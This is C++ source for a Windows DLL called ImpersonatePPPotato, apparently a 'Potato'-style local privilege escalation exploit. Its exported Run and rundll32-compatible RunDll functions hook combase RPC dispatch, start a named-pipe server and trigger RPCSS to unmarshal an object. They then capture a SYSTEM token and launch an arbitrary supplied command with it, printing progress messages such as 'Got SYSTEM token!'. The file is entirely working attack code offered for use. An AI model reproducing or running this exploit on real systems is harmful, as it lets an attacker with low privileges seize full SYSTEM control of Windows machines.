#include "ImpersonatePPPotatoContext.h"
#include "ImpersonatePPPotatoUnmarshalTrigger.h"
#include <iostream>
#include <string>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) BOOL WINAPI Run(LPCWSTR command, LPCWSTR pipeName) {
    if (!command || command[0] == L'\0') return FALSE;

    std::wstring cmd(command);
    std::wstring pipe(pipeName && pipeName[0] ? pipeName : L"ImpersonatePPPotato");

    try {
        ImpersonatePPPotato::ImpersonatePPPotatoContext context(std::wcout, pipe);

        std::wcout << L"[*] CombaseModule: 0x" << std::hex << context.GetCombaseModule() << std::endl;
        std::wcout << L"[*] DispatchTable: 0x" << std::hex << context.GetDispatchTablePtr() << std::endl;
        std::wcout << L"[*] UseProtseqFunction: 0x" << std::hex << context.GetUseProtseqFunctionPtr() << std::endl;
        std::wcout << L"[*] UseProtseqFunctionParamCount: " << std::dec << (int)context.GetUseProtseqFunctionParamCount() << std::endl;

        HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
        if (FAILED(hr) && hr != RPC_E_TOO_LATE) {
            std::wcerr << L"[!] CoInitializeEx failed: 0x" << std::hex << hr << L"\n";
        }

        std::wcout << L"[*] HookRPC...\n";
        context.HookRPC();

        std::wcout << L"[*] Start PipeServer...\n";
        context.Start();

        std::wcout << L"\n[*] Trigger RPCSS\n";
        ImpersonatePPPotato::ImpersonatePPPotatoUnmarshalTrigger unmarshalTrigger(&context);

        hr = unmarshalTrigger.Trigger();
        std::wcout << L"[*] UnmarshalObject: 0x" << std::hex << hr << std::endl;

        HANDLE hSystemToken = context.GetToken();
        BOOL bResult = FALSE;

        if (hSystemToken) {
            std::wcout << L"[+] Got SYSTEM token!\n";
            std::wcout << L"[*] Executing command: " << cmd << L"\n";

            std::wstring output;
            bResult = context.CreateProcessWithToken(hSystemToken, cmd.c_str(), &output);

            if (bResult) {
                std::wcout << L"[+] Command executed successfully.\n";
                if (!output.empty()) {
                    std::wcout << output << L"\n";
                }
            } else {
                std::wcerr << L"[-] Failed to execute command. Error: " << GetLastError() << L"\n";
            }
        } else {
            std::wcerr << L"[!] Failed to acquire SYSTEM token\n";
        }

        context.Restore();
        context.Stop();

        return bResult;
    }
    catch (const std::exception& e) {
        OutputDebugStringA(e.what());
        return FALSE;
    }
    catch (...) {
        return FALSE;
    }
}

// Entry point compatible with rundll32.
// Syntax: rundll32.exe ImpersonatePPPotato.dll,RunDll <command>
extern "C" __declspec(dllexport) void CALLBACK RunDll(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow) {
    Run(lpszCmdLine, L"ImpersonatePPPotato");
}
